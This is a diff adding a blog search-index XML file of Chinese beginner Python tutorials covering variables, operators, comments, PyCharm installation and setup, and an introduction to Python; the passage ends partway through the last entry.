@@ -1,0 +1,151 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[变量的基本使用]]></title>
+    <url>%2F2019%2F01%2F18%2F08_%E5%8F%98%E9%87%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
+    <content type="text"><![CDATA[程序就是用来处理数据的，而变量就是用来存储数据的 目标 变量定义 变量的类型 变量的命名 01. 变量定义 在 Python 中，每个变量 在使用前都必须赋值，变量 赋值以后 该变量 才会被创建 等号（=）用来给变量赋值 = 左边是一个变量名 = 右边是存储在变量中的值 1变量名 = 值 变量定义之后，后续就可以直接使用了 1) 变量演练1 —— iPython12345678910111213# 定义 qq_number 的变量用来保存 qq 号码In [1]: qq_number = "1234567"# 输出 qq_number 中保存的内容In [2]: qq_numberOut[2]: '1234567'# 定义 qq_password 的变量用来保存 qq 密码In [3]: qq_password = "123"# 输出 qq_password 中保存的内容In [4]: qq_passwordOut[4]: '123' 使用交互式方式，如果要查看变量内容，直接输入变量名即可，不需要使用 print 函数 2) 变量演练 2 —— PyCharm123456789# 定义 qq 号码变量qq_number = "1234567"# 定义 qq 密码变量qq_password = "123"# 在程序中，如果要输出变量的内容，需要使用 print 函数print(qq_number)print(qq_password) 使用解释器执行，如果要输出变量的内容，必须要要使用 print 函数 3) 变量演练 3 —— 超市买苹果 可以用 其他变量的计算结果 来定义变量 变量定义之后，后续就可以直接使用了 需求 苹果的价格是 8.5 元/斤 买了 7.5 斤 苹果 计算付款金额 12345678910# 定义苹果价格变量price = 8.5# 定义购买重量weight = 7.5# 计算金额money = price * weightprint(money) 思考题 如果 只要买苹果，就返 5 块钱 请重新计算购买金额 123456789101112# 定义苹果价格变量price = 8.5# 定义购买重量weight = 7.5# 计算金额money = price * weight# 只要买苹果就返 5 元money = money - 5print(money) 提问 上述代码中，一共定义有几个变量？ 三个：price／weight／money money = money - 5 是在定义新的变量还是在使用变量？ 直接使用之前已经定义的变量 变量名 只有在 第一次出现 才是 定义变量 变量名 再次出现，不是定义变量，而是直接使用之前定义过的变量 在程序开发中，可以修改之前定义变量中保存的值吗？ 可以 变量中存储的值，就是可以 变 的 02. 变量的类型 在内存中创建一个变量，会包括： 变量的名称 变量保存的数据 变量存储数据的类型 变量的地址（标示） 2.1 变量类型的演练 —— 个人信息需求 定义变量保存小明的个人信息 姓名：小明 年龄：18 岁 性别：是男生 身高：1.75 米 体重：75.0 公斤 利用 单步调试 确认变量中保存数据的类型 提问 在演练中，一共有几种数据类型？ 4 种 str —— 字符串 bool —— 布尔（真假） int —— 整数 float —— 浮点数（小数） 在 Python 中定义变量时需要指定类型吗？ 不需要 Python 可以根据 = 等号右侧的值，自动推导出变量中存储数据的类型 2.2 变量的类型 在 Python 中定义变量是 不需要指定类型（在其他很多高级语言中都需要） 数据类型可以分为 数字型 和 非数字型 数字型 整型 (int) 浮点型（float） 布尔型（bool） 真 True 非 0 数 —— 非零即真 假 False 0 复数型 (complex) 主要用于科学计算，例如：平面场问题、波动问题、电感电容等问题 非数字型 字符串 列表 元组 字典 提示：在 Python 2.x 中，整数 根据保存数值的长度还分为： int（整数） long（长整数） 使用 type 函数可以查看一个变量的类型 1In [1]: type(name) 2.3 不同类型变量之间的计算1) 数字型变量 之间可以直接计算 在 Python 中，两个数字型变量是可以直接进行 算数运算的 如果变量是 bool 型，在计算时 True 对应的数字是 1 False 对应的数字是 0 演练步骤 定义整数 i = 10 定义浮点数 f = 10.5 定义布尔型 b = True 在 iPython 中，使用上述三个变量相互进行算术运算 2) 字符串变量 之间使用 + 拼接字符串 在 Python 中，字符串之间可以使用 + 拼接生成新的字符串 123456In [1]: first_name = "三"In [2]: last_name = "张"In [3]: first_name + last_nameOut[3]: '三张' 3) 字符串变量 可以和 整数 使用 * 重复拼接相同的字符串12In [1]: "-" * 50Out[1]: '--------------------------------------------------' 4) 数字型变量 和 字符串 之间 不能进行其他计算12345678In [1]: first_name = "zhang"In [2]: x = 10In [3]: x + first_name---------------------------------------------------------------------------TypeError: unsupported operand type(s) for +: 'int' and 'str'类型错误：`+` 不支持的操作类型：`int` 和 `str` 2.4 变量的输入 所谓 输入，就是 用代码 获取 用户通过 键盘 输入的信息 例如：去银行取钱，在 ATM 上输入密码 在 Python 中，如果要获取用户在 键盘 上的输入信息，需要使用到 input 函数 1) 关于函数 一个 提前准备好的功能(别人或者自己写的代码)，可以直接使用，而 不用关心内部的细节 目前已经学习过的函数 函数 说明 print(x) 将 x 输出到控制台 type(x) 查看 x 的变量类型 2) input 函数实现键盘输入 在 Python 中可以使用 input 函数从键盘等待用户的输入 用户输入的 任何内容 Python 都认为是一个 字符串 语法如下： 1字符串变量 = input("提示信息：") 3) 类型转换函数 函数 说明 int(x) 将 x 转换为一个整数 float(x) 将 x 转换到一个浮点数 4) 变量输入演练 —— 超市买苹果增强版需求 收银员输入 苹果的价格，单位：元／斤 收银员输入 用户购买苹果的重量，单位：斤 计算并且 输出 付款金额 演练方式 11234567891011121314151617# 1. 输入苹果单价price_str = input("请输入苹果价格：")# 2. 要求苹果重量weight_str = input("请输入苹果重量：")# 3. 计算金额# 1&gt; 将苹果单价转换成小数price = float(price_str)# 2&gt; 将苹果重量转换成小数weight = float(weight_str)# 3&gt; 计算付款金额money = price * weightprint(money) 提问 演练中，针对 价格 定义了几个变量？ 两个 price_str 记录用户输入的价格字符串 price 记录转换后的价格数值 思考 —— 如果开发中，需要用户通过控制台 输入 很多个 数字，针对每一个数字都要定义两个变量，方便吗？ 演练方式 2 —— 买苹果改进版 定义 一个 浮点变量 接收用户输入的同时，就使用 float 函数进行转换 1price = float(input("请输入价格:")) 改进后的好处： 节约空间，只需要为一个变量分配空间 起名字方便，不需要为中间变量起名字 改进后的“缺点”： 初学者需要知道，两个函数能够嵌套使用，稍微有一些难度 提示 如果输入的不是一个数字，程序执行时会出错，有关数据转换的高级话题，后续会讲！ 2.5 变量的格式化输出 苹果单价 9.00 元／斤，购买了 5.00 斤，需要支付 45.00 元 在 Python 中可以使用 print 函数将信息输出到控制台 如果希望输出文字信息的同时，一起输出 数据，就需要使用到 格式化操作符 % 被称为 格式化操作符，专门用于处理字符串中的格式 包含 % 的字符串，被称为 格式化字符串 % 和不同的 字符 连用，不同类型的数据 需要使用 不同的格式化字符 格式化字符 含义 %s 字符串 %d 有符号十进制整数，%06d 表示输出的整数显示位数，不足的地方使用 0 补全 %f 浮点数，%.2f 表示小数点后只显示两位 %% 输出 % 语法格式如下： 123print("格式化字符串" % 变量1)print("格式化字符串" % (变量1, 变量2...)) 格式化输出演练 —— 基本练习需求 定义字符串变量 name，输出 我的名字叫 小明，请多多关照！ 定义整数变量 student_no，输出 我的学号是 000001 定义小数 price、weight、money，输出 苹果单价 9.00 元／斤，购买了 5.00 斤，需要支付 45.00 元 定义一个小数 scale，输出 数据比例是 10.00% 1234print("我的名字叫 %s，请多多关照！" % name)print("我的学号是 %06d" % student_no)print("苹果单价 %.02f 元／斤，购买 %.02f 斤，需要支付 %.02f 元" % (price, weight, money))print("数据比例是 %.02f%%" % (scale * 100)) 课后练习 —— 个人名片需求 在控制台依次提示用户输入：姓名、公司、职位、电话、邮箱 按照以下格式输出： 12345678**************************************************公司名称姓名 (职位)电话：电话邮箱：邮箱************************************************** 实现代码如下： 1234567891011121314151617"""在控制台依次提示用户输入：姓名、公司、职位、电话、电子邮箱"""name = input("请输入姓名：")company = input("请输入公司：")title = input("请输入职位：")phone = input("请输入电话：")email = input("请输入邮箱：")print("*" * 50)print(company)print()print("%s (%s)" % (name, title))print()print("电话：%s" % phone)print("邮箱：%s" % email)print("*" * 50)]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[程序执行原理（科普）]]></title>
+    <url>%2F2019%2F01%2F18%2F07_%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%EF%BC%88%E7%A7%91%E6%99%AE%EF%BC%89%2F</url>
+    <content type="text"><![CDATA[目标 计算机中的 三大件 程序执行的原理 程序的作用 01. 计算机中的三大件计算机中包含有较多的硬件，但是一个程序要运行，有 三个 核心的硬件，分别是： CPU 中央处理器，是一块超大规模的集成电路 负责 处理数据／计算 内存 临时 存储数据（断电之后，数据会消失） 速度快 空间小（单位价格高） 硬盘 永久 存储数据 速度慢 空间大（单位价格低） CPU 内存 硬盘 思考题 计算机中哪一个硬件设备负责执行程序？ CPU 内存 的速度快还是 硬盘 的速度快？ 内存 我们的程序是安装在内存中的，还是安装在硬盘中的？ 硬盘 我买了一个内存条，有 500G 的空间！！！，这句话对吗？ 不对，内存条通常只有 4G / 8G / 16G / 32G 计算机关机之后，内存中的数据都会消失，这句话对吗？ 正确 02. 程序执行的原理 程序 运行之前，程序是 保存在硬盘 中的 当要运行一个程序时 操作系统会首先让 CPU 把程序复制到 内存 中 CPU 执行 内存 中的 程序代码 程序要执行，首先要被加载到内存 2.1 Python 程序执行原理 操作系统会首先让 CPU 把 Python 解释器 的程序复制到 内存 中 Python 解释器 根据语法规则，从上向下 让 CPU 翻译 Python 程序中的代码 CPU 负责执行翻译完成的代码 Python 的解释器有多大？ 执行以下终端命令可以查看 Python 解释器的大小 12345678# 1. 确认解释器所在位置$ which python# 2. 查看 python 文件大小(只是一个软链接)$ ls -lh /usr/bin/python# 3. 查看具体文件大小$ ls -lh /usr/bin/python2.7 提示：建立 软链接 的目的，是为了方便使用者不用记住使用的解释器是 哪一个具体版本 03. 程序的作用 程序就是 用来处理数据 的！ 新闻软件 提供的 新闻内容、评论…… 是数据 电商软件 提供的 商品信息、配送信息…… 是数据 运动类软件 提供的 运动数据…… 是数据 地图类软件 提供的 地图信息、定位信息、车辆信息…… 是数据 即时通讯软件 提供的 聊天信息、好友信息…… 是数据 …… 3.1 思考 QQ 程序的启动过程 QQ 在运行之前，是保存在 硬盘 中的 运行之后，QQ 程序就会被加载到 内存 中了 3.2 思考 QQ 程序的 登录 过程 读取用户输入的 QQ 号码 读取用户输入的 QQ 密码 将 QQ 号码 和 QQ 密码 发送给腾讯的服务器，等待服务器确认用户信息 思考 1 在 QQ 这个程序将 QQ 号码 和 QQ 密码 发送给服务器之前，是否需要先存储一下 QQ 号码 和 密码? 答案 肯定需要！—— 否则 QQ 这个程序就不知道把什么内容发送给服务器了！ 思考 2 QQ 这个程序把 QQ 号码 和 QQ 密码 保存在哪里？ 答案 保存在 内存 中，因为 QQ 程序自己就在内存中 思考 3 QQ 这个程序是怎么保存用户的 QQ 号码 和 QQ 密码 的？ 答案 在内存中为 QQ 号码 和 QQ 密码 各自分配一块空间 在 QQ 程序结束之前，这两块空间是由 QQ 程序负责管理的，其他任何程序都不允许使用 在 QQ 自己使用完成之前，这两块空间始终都只负责保存 QQ 号码 和 QQ 密码 使用一个 别名 标记 QQ 号码 和 QQ 密码 在内存中的位置 在程序内部，为 QQ 号码 和 QQ 密码 在内存中分配的空间就叫做 变量 程序就是用来处理数据的，而变量就是用来存储数据的]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[算数运算符]]></title>
+    <url>%2F2019%2F01%2F18%2F06_%E7%AE%97%E6%95%B0%E8%BF%90%E7%AE%97%E7%AC%A6%2F</url>
+    <content type="text"><![CDATA[计算机，顾名思义就是负责进行 数学计算 并且 存储计算结果 的电子设备 目标 算术运算符的基本使用 01. 算数运算符 算数运算符是 运算符的一种 是完成基本的算术运算使用的符号，用来处理四则运算 运算符 描述 实例 + 加 10 + 20 = 30 - 减 10 - 20 = -10 * 乘 10 * 20 = 200 / 除 10 / 20 = 0.5 // 取整除 返回除法的整数部分（商） 9 // 2 输出结果 4 % 取余数 返回除法的余数 9 % 2 = 1 ** 幂 又称次方、乘方，2 ** 3 = 8 在 Python 中 * 运算符还可以用于字符串，计算结果就是字符串重复指定次数的结果 12In [1]: "-" * 50Out[1]: '----------------------------------------' 02. 算数运算符的优先级 和数学中的运算符的优先级一致，在 Python 中进行数学计算时，同样也是： 先乘除后加减 同级运算符是 从左至右 计算 可以使用 () 调整计算的优先级 以下表格的算数优先级由高到最低顺序排列 运算符 描述 ** 幂 (最高优先级) * / % // 乘、除、取余数、取整除 + - 加法、减法 例如： 2 + 3 * 5 = 17 (2 + 3) * 5 = 25 2 * 3 + 5 = 11 2 * (3 + 5) = 16]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[注释]]></title>
+    <url>%2F2019%2F01%2F18%2F05_%E6%B3%A8%E9%87%8A%2F</url>
+    <content type="text"><![CDATA[目标 注释的作用 单行注释（行注释） 多行注释（块注释） 01. 注释的作用 使用用自己熟悉的语言，在程序中对某些代码进行标注说明，增强程序的可读性 02. 单行注释(行注释) 以 # 开头，# 右边的所有东西都被当做说明文字，而不是真正要执行的程序，只起到辅助说明作用 示例代码如下： 12# 这是第一个单行注释print("hello python") 为了保证代码的可读性，# 后面建议先添加一个空格，然后再编写相应的说明文字 在代码后面增加的单行注释 在程序开发时，同样可以使用 # 在代码的后面（旁边）增加说明性的文字 但是，需要注意的是，为了保证代码的可读性，注释和代码之间 至少要有 两个空格 示例代码如下： 1print("hello python") # 输出 `hello python` 03. 多行注释（块注释） 如果希望编写的 注释信息很多，一行无法显示，就可以使用多行注释 要在 Python 程序中使用多行注释，可以用 一对 连续的 三个 引号(单引号和双引号都可以) 示例代码如下： 123456"""这是一个多行注释在多行注释之间，可以写很多很多的内容……"""print("hello python") 什么时候需要使用注释？ 注释不是越多越好，对于一目了然的代码，不需要添加注释 对于 复杂的操作，应该在操作开始前写上若干行注释 对于 不是一目了然的代码，应在其行尾添加注释（为了提高可读性，注释应该至少离开代码 2 个空格） 绝不要描述代码，假设阅读代码的人比你更懂 Python，他只是不知道你的代码要做什么 在一些正规的开发团队，通常会有 代码审核 的惯例，就是一个团队中彼此阅读对方的代码 关于代码规范 Python 官方提供有一系列 PEP（Python Enhancement Proposals） 文档 其中第 8 篇文档专门针对 Python 的代码格式 给出了建议，也就是俗称的 PEP 8 文档地址：https://www.python.org/dev/peps/pep-0008/ 谷歌有对应的中文文档：http://zh-google-styleguide.readthedocs.io/en/latest/google-python-styleguide/python_style_rules/ 任何语言的程序员，编写出符合规范的代码，是开始程序生涯的第一步]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[多文件项目的演练]]></title>
+    <url>%2F2019%2F01%2F18%2F04_%E5%A4%9A%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%BC%94%E7%BB%83%2F</url>
+    <content type="text"><![CDATA[开发 项目 就是开发一个 专门解决一个复杂业务功能的软件 通常每 一个项目 就具有一个 独立专属的目录，用于保存 所有和项目相关的文件 一个项目通常会包含 很多源文件 目标 在项目中添加多个文件，并且设置文件的执行 多文件项目演练 在 01_Python基础 项目中新建一个 hm_02_第2个Python程序.py 在 hm_02_第2个Python程序.py 文件中添加一句 print(&quot;hello&quot;) 点击右键执行 hm_02_第2个Python程序.py 提示 在 PyCharm 中，要想让哪一个 Python 程序能够执行，必须首先通过 鼠标右键的方式执行 一下 对于初学者而言，在一个项目中设置多个程序可以执行，是非常方便的，可以方便对不同知识点的练习和测试 对于商业项目而言，通常在一个项目中，只有一个 可以直接执行的 Python 源程序]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[PyCharm 的初始设置（知道）]]></title>
+    <url>%2F2019%2F01%2F18%2F03_PyCharm%20%E7%9A%84%E5%88%9D%E5%A7%8B%E8%AE%BE%E7%BD%AE%EF%BC%88%E7%9F%A5%E9%81%93%EF%BC%89%2F</url>
+    <content type="text"><![CDATA[目标 恢复 PyCharm 的初始设置 第一次启动 PyCharm 新建一个 Python 项目 设置 PyCharm 的字体显示 PyCharm 的升级以及其他 PyCharm 的官方网站地址是：https://www.jetbrains.com/pycharm/ 01. 恢复 PyCharm 的初始设置PyCharm 的 配置信息 是保存在 用户家目录下 的 .PyCharmxxxx.x 目录下的，xxxx.x 表示当前使用的 PyCharm 的版本号 如果要恢复 PyCharm 的初始设置，可以按照以下步骤进行： 关闭正在运行的 PyCharm 在终端中执行以下终端命令，删除 PyCharm 的配置信息目录： 1$ rm -r ~/.PyCharm2016.3 重新启动 PyCharm 02. 第一次启动 PyCharm 导入配置信息 选择许可协议 配置初始界面 2.1 导入配置信息 在第一次启动 PyCharm 时，会首先提示用户是否导入 之前的配置信息 如果是第一次使用，直接点击 OK 按钮 2.2 选择许可协议 PyCharm 是一个付费软件，购买费用为 199$ / 年 或者 19.90$ ／ 月 不过 PyCharm 提供了对 学生和教师免费使用的版本 下载地址是：https://www.jetbrains.com/pycharm-edu/download/#section=linux 商业版本会提示输入注册信息，或者选择免费评估 2.3 PyCharm 的配置初始界面 在初始配置界面，可以通过 Editor colors and fonts 选择 编辑器的配色方案 2.4 欢迎界面 所有基础配置工作结束之后，就可以看到 PyCharm 的 欢迎界面了，通过 欢迎界面 就可以开始开发 Python 项目了 03. 新建/打开一个 Python 项目3.1 项目简介 开发 项目 就是开发一个 专门解决一个复杂业务功能的软件 通常每 一个项目 就具有一个 独立专属的目录，用于保存 所有和项目相关的文件 一个项目通常会包含 很多源文件 3.2 打开 Python 项目 直接点击 Open 按钮，然后浏览到之前保存 Python 文件的目录，既可以打开项目 打开之后，会在目录下新建一个 .idea 的目录，用于保存 项目相关的信息，例如：解释器版本、项目包含的文件等等 第一次打开项目，需要耐心等待 PyCharm 对项目进行初始设置 设置项目使用的解释器版本 打开的目录如果不是由 PyCharm 建立的项目目录，有的时候 使用的解释器版本是 Python 2.x 的，需要单独设置解释器的版本 通过 File / Settings… 可以打开设置窗口，如下图所示： 3.3 新建项目1) 命名规则 以后 项目名 前面都以 数字编号，随着知识点递增，编号递增 例如：01_Python 基础、02_分支、03_循环… 每个项目下的 文件名 都以 hm_xx_知识点 方式来命名 其中 xx 是演练文件的序号 注意 命名文件名时建议只使用 小写字母、数字 和 下划线 文件名不能以数字开始 通过 欢迎界面 或者菜单 File / New Project 可以新建项目 2) 演练步骤 新建 01_Python基础 项目，使用 Python 3.x 解释器 在项目下新建 hm_01_hello.py Python 文件 编写 print(&quot;Hello Python&quot;) 代码 04. 设置 PyCharm 的字体显示 05. PyCharm 的升级以及其他 PyCharm 提供了对 学生和教师免费使用的版本 教育版下载地址：https://www.jetbrains.com/pycharm-edu/download/#section=linux 专业版下载地址：https://www.jetbrains.com/pycharm/download/#section=linux 5.1 安装和启动步骤 执行以下终端命令，解压缩下载后的安装包 1$ tar -zxvf pycharm-professional-2017.1.3.tar.gz 将解压缩后的目录移动到 /opt 目录下，可以方便其他用户使用 /opt 目录用户存放给主机额外安装的软件 1$ sudo mv pycharm-2017.1.3/ /opt/ 切换工作目录 1$ cd /opt/pycharm-2017.1.3/bin 启动 PyCharm 1$ ./pycharm.sh 5.2 设置专业版启动图标 在专业版中，选择菜单 Tools / Create Desktop Entry… 可以设置任务栏启动图标 注意：设置图标时，需要勾选 Create the entry for all users 5.3 卸载之前版本的 PyCharm1) 程序安装 程序文件目录 将安装包解压缩，并且移动到 /opt 目录下 所有的相关文件都保存在解压缩的目录中 配置文件目录 启动 PyCharm 后，会在用户家目录下建立一个 .PyCharmxxx 的隐藏目录 保存 PyCharm 相关的配置信息 快捷方式文件 /usr/share/applications/jetbrains-pycharm.desktop 在 ubuntu 中，应用程序启动的快捷方式通常都保存在 /usr/share/applications 目录下 2) 程序卸载 要卸载 PyCharm 只需要做以下两步工作： 删除解压缩目录 1$ sudo rm -r /opt/pycharm-2016.3.1/ 删除家目录下用于保存配置信息的隐藏目录 1$ rm -r ~/.PyCharm2016.3/ 如果不再使用 PyCharm 还需要将 /usr/share/applications/ 下的 jetbrains-pycharm.desktop 删掉 5.4 教育版安装演练12345678# 1. 解压缩下载后的安装包$ tar -zxvf pycharm-edu-3.5.1.tar.gz# 2. 将解压缩后的目录移动到 `/opt` 目录下，可以方便其他用户使用$ sudo mv pycharm-edu-3.5.1/ /opt/# 3. 启动 `PyCharm`/opt/pycharm-edu-3.5.1/bin/pycharm.sh 后续课程都使用专业版本演练 设置启动图标 编辑快捷方式文件 1$ sudo gedit /usr/share/applications/jetbrains-pycharm.desktop 按照以下内容修改文件内容，需要注意指定正确的 pycharm 目录 12345678910[Desktop Entry]Version=1.0Type=ApplicationName=PyCharmIcon=/opt/pycharm-edu-3.5.1/bin/pycharm.pngExec=&quot;/opt/pycharm-edu-3.5.1/bin/pycharm.sh&quot; %fComment=The Drive to DevelopCategories=Development;IDE;Terminal=falseStartupWMClass=jetbrains-pycharm]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[第一个 Python 程序]]></title>
+    <url>%2F2019%2F01%2F18%2F02_%E7%AC%AC%E4%B8%80%E4%B8%AA%20Python%20%E7%A8%8B%E5%BA%8F%2F</url>
+    <content type="text"><![CDATA[目标 第一个 HelloPython 程序 Python 2.x 与 3​​.x 版本简介 执行 Python 程序的三种方式 解释器 —— python / python3 交互式 —— ipython 集成开发环境 —— PyCharm 01. 第一个 HelloPython 程序1.1 Python 源程序的基本概念 Python 源程序就是一个特殊格式的文本文件，可以使用任意文本编辑软件做 Python 的开发 Python 程序的 文件扩展名 通常都是 .py 1.2 演练步骤 在桌面下，新建 认识Python 目录 在 认识Python 目录下新建 01-HelloPython.py 文件 使用 gedit 编辑 01-HelloPython.py 并且输入以下内容： 12print("hello python")print("hello world") 在终端中输入以下命令执行 01-HelloPython.py 1$ python 01-HelloPython.py print 是 python 中我们学习的第一个 函数 print 函数的作用，可以把 “” 内部的内容，输出到屏幕上 1.3 演练扩展 —— 认识错误（BUG）关于错误 编写的程序不能正常执行，或者执行的结果不是我们期望的 俗称 BUG，是程序员在开发时非常常见的，初学者常见错误的原因包括： 手误 对已经学习过的知识理解还存在不足 对语言还有需要学习和提升的内容 在学习语言时，不仅要学会语言的语法，而且还要学会如何认识错误和解决错误的方法 每一个程序员都是在不断地修改错误中成长的 第一个演练中的常见错误 1&gt; 手误，例如使用 pirnt(&quot;Hello world&quot;) 123NameError: name &apos;pirnt&apos; is not defined名称错误：&apos;pirnt&apos; 名字没有定义 2&gt; 将多条 print 写在一行 123SyntaxError: invalid syntax语法错误：语法无效 每行代码负责完成一个动作 3&gt; 缩进错误 123IndentationError: unexpected indent缩进错误：不期望出现的缩进 Python 是一个格式非常严格的程序设计语言 目前而言，大家记住每行代码前面都不要增加空格 4&gt; python 2.x 默认不支持中文 目前市场上有两个 Python 的版本并存着，分别是 Python 2.x 和 Python 3.x Python 2.x 默认不支持中文，具体原因，等到介绍 字符编码 时给大家讲解 Python 2.x 的解释器名称是 python Python 3.x 的解释器名称是 python3 123456SyntaxError: Non-ASCII character &apos;\xe4&apos; in file 01-HelloPython.py on line 3,but no encoding declared;see http://python.org/dev/peps/pep-0263/ for details语法错误： 在 01-HelloPython.py 中第 3 行出现了非 ASCII 字符 &apos;\xe4&apos;，但是没有声明文件编码请访问 http://python.org/dev/peps/pep-0263/ 了解详细信息 ASCII 字符只包含 256 个字符，不支持中文 有关字符编码的问题，后续会讲 单词列表12345678910111213* error 错误* name 名字* defined 已经定义* syntax 语法* invalid 无效* Indentation 索引* unexpected 意外的，不期望的* character 字符* line 行* encoding 编码* declared 声明* details 细节，详细信息* ASCII 一种字符编码 02. Python 2.x 与 3​​.x 版本简介目前市场上有两个 Python 的版本并存着，分别是 Python 2.x 和 Python 3.x 新的 Python 程序建议使用 Python 3.0 版本的语法 Python 2.x 是 过去的版本 解释器名称是 python Python 3.x 是 现在和未来 主流的版本 解释器名称是 python3 相对于 Python 的早期版本，这是一个 较大的升级 为了不带入过多的累赘，Python 3.0 在设计的时候 没有考虑向下兼容 许多早期 Python 版本设计的程序都无法在 Python 3.0 上正常执行 Python 3.0 发布于 2008 年 到目前为止，Python 3.0 的稳定版本已经有很多年了 Python 3.3 发布于 2012 Python 3.4 发布于 2014 Python 3.5 发布于 2015 Python 3.6 发布于 2016 为了照顾现有的程序，官方提供了一个过渡版本 —— Python 2.6 基本使用了 Python 2.x 的语法和库 同时考虑了向 Python 3.0 的迁移，允许使用部分 Python 3.0 的语法与函数 2010 年中推出的 Python 2.7 被确定为 最后一个Python 2.x 版本 提示：如果开发时，无法立即使用 Python 3.0（还有极少的第三方库不支持 3.0 的语法），建议 先使用 Python 3.0 版本进行开发 然后使用 Python 2.6、Python 2.7 来执行，并且做一些兼容性的处理 03. 执行 Python 程序的三种方式3.1. 解释器 python / python3Python 的解释器12345# 使用 python 2.x 解释器$ python xxx.py# 使用 python 3.x 解释器$ python3 xxx.py 其他解释器（知道）Python 的解释器 如今有多个语言的实现，包括： CPython —— 官方版本的 C 语言实现 Jython —— 可以运行在 Java 平台 IronPython —— 可以运行在 .NET 和 Mono 平台 PyPy —— Python 实现的，支持 JIT 即时编译 3.2. 交互式运行 Python 程序 直接在终端中运行解释器，而不输入要执行的文件名 在 Python 的 Shell 中直接输入 Python 的代码，会立即看到程序执行结果 1) 交互式运行 Python 的优缺点优点 适合于学习/验证 Python 语法或者局部代码 缺点 代码不能保存 不适合运行太大的程序 2) 退出 官方的解释器1&gt; 直接输入 exit()1&gt;&gt;&gt; exit() 2&gt; 使用热键退出在 python 解释器中，按热键 ctrl + d 可以退出解释器 3) IPython IPython 中 的 “I” 代表 交互 interactive 特点 IPython 是一个 python 的 交互式 shell，比默认的 python shell 好用得多 支持自动补全 自动缩进 支持 bash shell 命令 内置了许多很有用的功能和函数 IPython 是基于 BSD 开源的 版本 Python 2.x 使用的解释器是 ipython Python 3.x 使用的解释器是 ipython3 要退出解释器可以有以下两种方式： 1&gt; 直接输入 exit1In [1]: exit 2&gt; 使用热键退出在 IPython 解释器中，按热键 ctrl + d，IPython 会询问是否退出解释器 IPython 的安装1$ sudo apt install ipython 3.3. Python 的 IDE —— PyCharm1） 集成开发环境（IDE）集成开发环境（IDE，Integrated Development Environment）—— 集成了开发软件需要的所有工具，一般包括以下工具： 图形用户界面 代码编辑器（支持 代码补全／自动缩进） 编译器／解释器 调试器（断点／单步执行） …… 2）PyCharm 介绍 PyCharm 是 Python 的一款非常优秀的集成开发环境 PyCharm 除了具有一般 IDE 所必备功能外，还可以在 Windows、Linux、macOS 下使用 PyCharm 适合开发大型项目 一个项目通常会包含 很多源文件 每个 源文件 的代码行数是有限的，通常在几百行之内 每个 源文件 各司其职，共同完成复杂的业务功能 3）PyCharm 快速体验 文件导航区域 能够 浏览／定位／打开 项目文件 文件编辑区域 能够 编辑 当前打开的文件 控制台区域 能够： 输出程序执行内容 跟踪调试代码的执行 右上角的 工具栏 能够 执行(SHIFT + F10) / 调试(SHIFT + F9) 代码 通过控制台上方的单步执行按钮(F8)，可以单步执行代码]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[认识 Python]]></title>
+    <url>%2F2019%2F01%2F17%2F01_%E8%AE%A4%E8%AF%86%20Python%2F</url>
+    <content type="text"><![CDATA[人生苦短，我用 Python —— Life is short, you need Python 目标 Python 的起源 为什么要用 Python？ Python 的特点 Python 的优缺点 01. Python 的起源 Python 的创始人为吉多·范罗苏姆（Guido van Rossum） 1989 年的圣诞节期间，吉多·范罗苏姆为了在阿姆斯特丹打发时间，决心开发一个新的解释程序，作为 ABC 语言的一种继承（感觉下什么叫牛人） ABC 是由吉多参加设计的一种教学语言，就吉多本人看来，ABC 这种语言非常优美和强大，是专门为非专业程序员设计的。但是 ABC 语言并没有成功，究其原因，吉多认为是非开放造成的。吉多决心在 Python 中避免这一错误，并获取了非常好的效果 之所以选中 Python（蟒蛇） 作为程序的名字，是因为他是 BBC 电视剧——蒙提·派森的飞行马戏团（Monty Python’s Flying Circus）的爱好者 1991 年，第一个 Python 解释器 诞生，它是用 C 语言实现的，并能够调用 C 语言的库文件 1.1 解释器（科普）计算机不能直接理解任何除机器语言以外的语言，所以必须要把程序员所写的程序语言翻译成机器语言，计算机才能执行程序。将其他语言翻译成机器语言的工具，被称为编译器 编译器翻译的方式有两种：一个是编译，另外一个是解释。两种方式之间的区别在于翻译时间点的不同。当编译器以解释方式运行的时候，也称之为解释器 编译型语言：程序在执行之前需要一个专门的编译过程，把程序编译成为机器语言的文件，运行时不需要重新翻译，直接使用编译的结果就行了。程序执行效率高，依赖编译器，跨平台性差些。如 C、C++ 解释型语言：解释型语言编写的程序不进行预先编译，以文本方式存储程序代码，会将代码一句一句直接运行。在发布程序时，看起来省了道编译工序，但是在运行程序的时候，必须先解释再运行 编译型语言和解释型语言对比 速度 —— 编译型语言比解释型语言执行速度快 跨平台性 —— 解释型语言比编译型语言跨平台性好 1.2 Python 的设计目标1999 年，吉多·范罗苏姆向 DARPA 提交了一条名为 “Computer Programming for Everybody” 的资金申请，并在后来说明了他对 Python 的目标： 一门简单直观的语言并与主要竞争者一样强大 开源，以便任何人都可以为它做贡献 代码像纯英语那样容易理解 适用于短期开发的日常任务 这些想法中的基本都已经成为现实，Python 已经成为一门流行的编程语言 1.3 Python 的设计哲学 优雅 明确 简单 Python 开发者的哲学是：用一种方法，最好是只有一种方法来做一件事 如果面临多种选择，Python 开发者一般会拒绝花俏的语法，而选择明确没有或者很少有歧义的语法 在 Python 社区，吉多被称为“仁慈的独裁者” 02. 为什么选择 Python？ 代码量少 …… 同一样问题，用不同的语言解决，代码量差距还是很多的，一般情况下 Python 是 Java 的 1/5，所以说 人生苦短，我用 Python 03. Python 特点 Python 是完全面向对象的语言 函数、模块、数字、字符串都是对象，在 Python 中一切皆对象 完全支持继承、重载、多重继承 